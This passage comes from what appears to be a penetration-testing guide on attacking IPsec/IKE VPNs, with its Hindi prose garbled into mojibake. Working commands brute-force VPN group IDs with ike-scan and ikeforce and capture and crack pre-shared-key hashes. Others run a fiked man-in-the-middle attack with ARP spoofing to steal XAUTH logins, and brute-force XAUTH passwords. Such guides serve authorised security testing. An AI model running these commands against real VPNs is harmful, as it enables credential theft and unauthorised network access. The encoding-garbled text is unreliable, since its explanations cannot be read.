
IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
рдпрд╣ рднреА nmap рд╕реНрдХреНрд░рд┐рдкреНрдЯ _**ike-version**_ рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рд╕рд╣реА рдЖрдИрдбреА (рд╕рдореВрд╣ рдирд╛рдо) рдЦреЛрдЬрдирд╛

рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рдЖрдХреНрд░рд╛рдордХ рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд╣реА рдЖрдИрдбреА (рд╕рдореВрд╣ рдирд╛рдо)ред рдЖрдкрдХреЛ рд╕рдВрднрд╛рд╡рддрдГ рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдо рдкрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдЗрд╕реЗ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред\
рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдореИрдВ рдЖрдкрдХреЛ 2 рд╡рд┐рдзрд┐рдпрд╛рдВ рд╕реБрдЭрд╛рдКрдВрдЧрд╛:

### ike-scan рдХреЗ рд╕рд╛рде рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдПрдХ рдирдХрд▓реА рдЖрдИрдбреА рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реЛрдз рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рд╣реИрд╢ рдЬреБрдЯрд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
рдпрджрд┐ **рдХреЛрдИ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рдЖрддрд╛** рд╣реИ, рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдпрд╣ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд╛ рддрд░реАрдХрд╛ рдХрд╛рдо рдХрд░реЗрдЧрд╛ред **рдпрджрд┐ рдХреЛрдИ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдЖрддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдирдХрд▓реА рд╣реИрд╢ рдПрдХ рдирдХрд▓реА рдЖрдИрдбреА рдХреЗ рд▓рд┐рдП рднреЗрдЬрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрд░реАрдХрд╛ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдирдХрд▓реА рд╣реИрд╢ рд╡рд╛рдкрд╕ рдЖ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рдЖрдзреБрдирд┐рдХ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ):

![](<../.gitbook/assets/image (110).png>)

рд▓реЗрдХрд┐рди рдЬреИрд╕рд╛ рдХрд┐ рдореИрдВрдиреЗ рдХрд╣рд╛ рд╣реИ, рдЕрдЧрд░ рдХреЛрдИ рд╣реИрд╢ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рдЖрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ **рд╕рдВрднрд╛рд╡рд┐рдд рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛** рдФрд░ рдЙрди рдЖрдИрдбреАрдЬ рдХреЛ рд╡рд╛рдкрд╕ рджреЗрдЧрд╛ рдЬрд╣рд╛рдВ рдПрдХ рд╡реИрдз рд╣реИрдВрдбрд╢реЗрдХ рд╡рд╛рдкрд╕ рдЖрддрд╛ рд╣реИ (рдпрд╣ рдПрдХ рд╡реИрдз рд╕рдореВрд╣ рдирд╛рдо рд╣реЛрдЧрд╛)ред

рдпрджрд┐ рдЖрдкрдиреЗ рдХреЛрдИ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ ike-scan рдХрдорд╛рдВрдб рдореЗрдВ рдЬреЛрдбрд╝реЗрдВред рдФрд░ рдпрджрд┐ рдЖрдкрдиреЗ рдХрдИ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬ рд▓рд┐рдП рд╣реИрдВ рддреЛ рдЙрди рд╕рднреА рдХреЛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рд▓реВрдк рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЬрд╝рд╛рдж рдорд╣рд╕реВрд╕ рдХрд░реЗрдВ (рдЖрдкрдХреЛ рд╕рднреА рдХреЛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдПрдХ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рди рдХрд░рдиреЗ рд▓рдЧреЗ)ред

рдЖрдк [ikeforce рдХреА рд╢рдмреНрджрд╛рд╡рд▓реА](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) рдпрд╛ [seclists рдореЗрдВ рдПрдХ](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) рд╕рд╛рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреА рд╢рдмреНрджрд╛рд╡рд▓реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### ID рдХреЛ рдЖрдИрдХреЗрд░ рдХреЗ рд╕рд╛рде рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) рднреА **ike-scan** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреА рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░ рд╕рдХреЗред рдпрд╣ рдЕрдкрдиреА рд╡рд┐рдзрд┐ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ **ike-scan** рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдПрдХ рд╡реИрдз рдЖрдИрдбреА рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗред

### рдЖрдИрдХреЗрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдЙрдкрдХрд░рдг **рд╡рд┐рднрд┐рдиреНрди рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛** рдЬреЛ **рдПрдХ рд╡реИрдз рдФрд░ рдПрдХ рдЕрд╡реИрдз рдЖрдИрдбреА рдХреЗ рдмреАрдЪ рднрд┐рдиреНрдирддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╣ рдЭреВрдареЗ рд╕рдХрд╛рд░рд╛рддреНрдордХ рдФрд░ рдЭреВрдареЗ рдирдХрд╛рд░рд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдореИрдВ рдЖрдИрдХреЗ-рд╕реНрдХреИрди рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдкрд╕рдВрдж рдХрд░рддрд╛ рд╣реВрдБ)ред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **ikeforce** рд╕рд░реНрд╡рд░ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдЖрдИрдбреА рднреЗрдЬреЗрдЧрд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрд░реАрдХрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ред

* **рдкрд╣рд▓реА рд╡рд┐рдзрд┐** рд╕рдореВрд╣ рдирд╛рдореЛрдВ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рд░реНрдЪ рдХрд░рдирд╛** рд╣реИ **рд╕рд┐рд╕реНрдХреЛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреА рдореГрдд рдкреАрдпрд░ рдбрд┐рдЯреЗрдХреНрд╢рди DPD** рдХреА рдЬрд╛рдирдХрд╛рд░реА (рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдХреЗрд╡рд▓ рдЙрд╕ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рджреНрд╡рдВрджреНрд╡реА рдпрджрд┐ рд╕рдореВрд╣ рдирд╛рдо рд╕рд╣реА рд╣реИ рддреЛ рдкреБрдирдГ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИ)ред
* рдЙрдкрд▓рдмреНрдз **рджреВрд╕рд░реА рд╡рд┐рдзрд┐** рд╣рд░ рдкреНрд░рдпрд╛рд╕ рдкрд░ рднреЗрдЬреЗ рдЧрдП рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХрднреА-рдХрднреА рд╕рд╣реА рдЖрдИрдбреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рдЕрдзрд┐рдХ рдкреИрдХреЗрдЯ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
* **рддреАрд╕рд░реА рд╡рд┐рдзрд┐** рдЧрд▓рдд рдЖрдИрдбреА рдХреЗ рдкреНрд░рддрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **"рдЕрд╡реИрдз рдЖрдИрдбреА-рдЬрд╛рдирдХрд╛рд░реА"** рдХреА рдЦреЛрдЬ рдХрд░рдирд╛ рд╣реИред
* рдЕрдВрддрддрдГ, рдпрджрд┐ рд╕рд░реНрд╡рд░ рдХрд┐рд╕реА рднреА рдЬрд╛рдВрдЪ рдХрд╛ рдХреЛрдИ рдЬрд╡рд╛рдм рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ, рддреЛ **ikeforce** рд╕рд░реНрд╡рд░ рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдФрд░ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рд╕рд╣реА рдЖрдИрдбреА рднреЗрдЬрдиреЗ рдкрд░ рд╕рд░реНрд╡рд░ рдХрд┐рд╕реА рдкреИрдХреЗрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред

рд╕реНрдкрд╖реНрдЯ рд╣реИ рдХрд┐ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдПрдХ рд╡реИрдз рдЖрдИрдбреА рд╣реЛрдиреЗ рдкрд░ **PSK** рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред рдлрд┐рд░, **рдЖрдИрдбреА** рдФрд░ **PSK** рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ XAUTH рдХреЛ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ (рдпрджрд┐ рдпрд╣ рд╕рдХреНрд╖рдо рд╣реИ)ред

рдпрджрд┐ рдЖрдкрдиреЗ рдХреЛрдИ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬ рд▓рд┐рдпрд╛ рд╣реИ рддреЛ рдЖрдИрдХреЗрдлреЛрд░реНрд╕ рдХрдорд╛рдВрдб рдореЗрдВ рдЙрд╕реЗ рдЬреЛрдбрд╝реЗрдВред рдФрд░ рдпрджрд┐ рдЖрдкрдиреЗ рдХрдИ рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬ рд▓рд┐рдП рд╣реИрдВ рддреЛ рдЙрдиреНрд╣реЗрдВ рд╕рднреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рд▓реВрдк рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рддрдВрддреНрд░ рдорд╣рд╕реВрд╕ рдХрд░реЗрдВ (рдЖрдкрдХреЛ рд╕рднреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдПрдХ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░ рд░рд╣рд╛ рд╣реЛ)ред
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### рдЖрдИрдбреА рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдирд╛

(рдкреБрд╕реНрддрдХ рд╕реЗ **рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди: рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдиреЗрдВ**): VPN рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдХреЗ рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рднреА рд╕рдВрднрд╡ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдкрд╣рд▓рд╛ рдПрдЧреНрд░реЗрд╕рд┐рд╡ рдореЛрдб рдкреИрдХреЗрдЯ рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдЖрдИрдбреА рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ, рд╡рд╣ рд╕рд╛рдлрд╝ рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

![](<../.gitbook/assets/image (111).png>)

## рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рдХреНрд░реИрдХ рдХрд░рдирд╛

рдЕрдВрддрддрдГ, рдЕрдЧрд░ рдЖрдкрдиреЗ рдПрдХ **рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди** рдФрд░ **рд╕рдореВрд╣ рдирд╛рдо** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдпрджрд┐ **рдПрдЧреНрд░реЗрд╕рд┐рд╡ рдореЛрдб рдЕрдиреБрдордд рд╣реИ**, рддреЛ рдЖрдк рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИрд╢ рдХреЛ рдкрдХрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
рд╣реИрд╢ _hash.txt_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк **psk-crack**, **john** (using [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) рдФрд░ **hashcat** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрд╢ рдХреЛ **crack** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**рдЖрдХреНрд░рд╛рдордХ рдореЛрдб IKE** рдХреЛ **рдкреВрд░реНрд╡-рд╕рд╛рдЭрд╛ рдХреБрдВрдЬреА (PSK)** рдХреЗ рд╕рд╛рде рдорд┐рд▓рд╛рдХрд░ рдЖрдо рддреМрд░ рдкрд░ **рд╕рдореВрд╣ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ **XAuth (рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг)** рджреНрд╡рд╛рд░рд╛ рдмрдврд╝рд╛рдИ рдЬрд╛рддреА рд╣реИ, рдЬреЛ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдкрд░рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реЛрддреА рд╣реИред рдРрд╕рд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд╛рдорд╛рдиреНрдпрдд: **Microsoft Active Directory**, **RADIUS**, рдпрд╛ рд╕рдордХрдХреНрд╖ рдкреНрд░рдгрд╛рд▓рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

**IKEv2** рдореЗрдВ рдкрд░рд┐рднреНрд░рдордг рдХрд░рддреЗ рд╣реБрдП, рдПрдХ рдкреНрд░рдореБрдЦ рдкрд░рд┐рд╡рд░реНрддрди рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдБ **EAP (рд╡рд┐рд╕реНрддрд╛рд░рдгреАрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓)** рдХрд╛ рдЙрдкрдпреЛрдЧ **XAuth** рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрди рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрдЪрд╛рд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реЛрдВ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрднреНрдпрд╛рд╕реЛрдВ рдореЗрдВ рдПрдХ рд╡рд┐рдХрд╛рд╕ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИред


### рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ MitM

рддрд╛рдХрд┐ рдЖрдк _fiked_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХреЗ рдбреЗрдЯрд╛ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХреЗрдВ рдФрд░ рджреЗрдЦ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ (рдЖрдкрдХреЛ IKE рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `fiked` рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЬреЛ ARP рд╕реНрдкреВрдлрд╝рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, [рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/))ред Fiked рдПрдХ VPN рдЕрдВрдд-рдмрд┐рдВрджреБ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░реЗрдЧрд╛ рдФрд░ XAuth рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### IPSec рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ MitM рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдкреЛрд░реНрдЯ 500 рдкрд░ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░реЗрдВ, рдпрджрд┐ IPSec рдЯрдирд▓ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддреЛ рд╢рд╛рдпрдж рдЯреНрд░реИрдлрд┐рдХ рд╕рд╛рдл рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

### ikeforce рдХреЗ рд╕рд╛рде XAUTH рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ

**XAUTH** (рдЬрдм рдЖрдк рдПрдХ рдорд╛рдиреНрдп рд╕рдореВрд╣ рдирд╛рдо **id** рдФрд░ **psk** рдЬрд╛рдирддреЗ рд╣реИрдВ) рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдХреА рд╕реВрдЪреА рдФрд░ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реВрдЪреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
рдЗрд╕ рддрд░рд╣, ikeforce рдпреВрдЬрд░рдиреЗрдо:рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЙрдореНрдмрд┐рдиреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ред

## IPSEC VPN рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгреАрдХрд░рдг

рдХрд╛рд▓реА рдореЗрдВ, **VPNC** рдХрд╛ рдЙрдкрдпреЛрдЧ IPsec рдЯрдирд▓ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **рдкреНрд░реЛрдлрд╛рдЗрд▓** рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП `/etc/vpnc/`ред рдЖрдк рдЗрди рдкреНрд░реЛрдлрд╛рдЗрд▓реНрд╕ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рд░рдВрдн рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ _**vpnc**_ред

